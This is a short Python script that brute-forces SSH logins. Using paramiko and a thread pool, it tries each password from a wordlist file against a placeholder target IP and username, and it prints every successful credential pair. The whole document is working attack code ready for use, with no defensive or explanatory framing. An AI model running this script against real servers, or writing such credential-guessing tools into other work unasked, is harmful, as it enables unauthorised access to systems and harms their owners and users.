import paramiko
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Back, Style, init

# Initialize Colorama
init(autoreset=True)

# Function to print status messages in color
def print_status(message, status_type="info"):
    if status_type == "info":
        print(Fore.CYAN + "[INFO] " + message)
    elif status_type == "success":
        print(Fore.GREEN + "[SUCCESS] " + message)
    elif status_type == "failure":
        print(Fore.RED + "[FAILURE] " + message)
    elif status_type == "warning":
        print(Fore.YELLOW + "[WARNING] " + message)

# SSH connection attempt function
def ssh_brute_force(ip, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        print_status(f"Successfully connected! Username: {username}, Password: {password}", "success")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print_status(f"Failed attempt. Username: {username}, Password: {password}", "failure")
        return False
    except Exception as e:
        print_status(f"Connection error: {e}", "warning")
        return False

# Load the wordlist from a file
def load_wordlist(wordlist_path):
    with open(wordlist_path, 'r') as f:
        return [line.strip() for line in f]

# Main function
def main():
    ip = 'target_ip_address'  # Target IP address
    port = 22  # SSH port
    username = 'target_username'  # Target username
    wordlist = load_wordlist('wordlist.txt')  # Wordlist for passwords

    print_status(f"Starting connection... IP: {ip}, Username: {username}", "info")

    # Using ThreadPoolExecutor for concurrency
    with ThreadPoolExecutor(max_workers=10) as executor:
        for password in wordlist:
            executor.submit(ssh_brute_force, ip, port, username, password)

if __name__ == "__main__":
    main()
